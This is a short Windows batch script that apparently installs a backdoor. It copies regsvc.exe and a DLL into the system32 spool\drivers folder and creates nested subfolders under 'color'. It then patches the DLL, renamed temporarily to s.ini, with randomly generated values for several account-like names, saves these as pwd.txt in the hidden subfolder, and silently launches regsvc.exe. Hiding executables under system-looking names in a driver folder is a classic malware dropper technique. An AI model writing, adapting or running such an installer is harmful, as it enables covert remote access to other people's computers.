@echo off
copy regsvc.exe %systemroot%\system32\spool\drivers\regsvc.exe
copy dtceindll32.dll %systemroot%\system32\spool\drivers\dtceindll32.dll
md %systemroot%\system32\spool\drivers\color
md %systemroot%\system32\spool\drivers\color\1
%systemdrive%
cd %systemroot%\system32\spool\drivers

ren dtceindll32.dll s.ini
change s.ini c:\winnt\system32\spool\drivers %systemroot%\system32\spool\drivers

echo CT-home-xxxxx >> p.lst
change s.ini 0000 random >> p.lst
echo. >> p.lst
echo. >> p.lst

echo esbxxxxx >> p.lst
change s.ini 0001 random >> p.lst
echo. >> p.lst
echo. >> p.lst

echo MnStRxxxxx >> p.lst
change s.ini 0002 random >> p.lst
echo. >> p.lst
echo. >> p.lst

echo NWNKxxxxx >> p.lst
change s.ini 0003 random >> p.lst
echo. >> p.lst
echo. >> p.lst

echo CsCxxxxx >> p.lst
change s.ini 0004 random >> p.lst
echo. >> p.lst
echo. >> p.lst

echo Liquidxxxxx >> p.lst
change s.ini 0005 random >> p.lst
echo. >> p.lst
echo. >> p.lst
ren s.ini dtceindll32.dll
move p.lst %systemroot%\system32\spool\drivers\color\1\pwd.txt

start %systemroot%\system32\spool\drivers\regsvc.exe
exit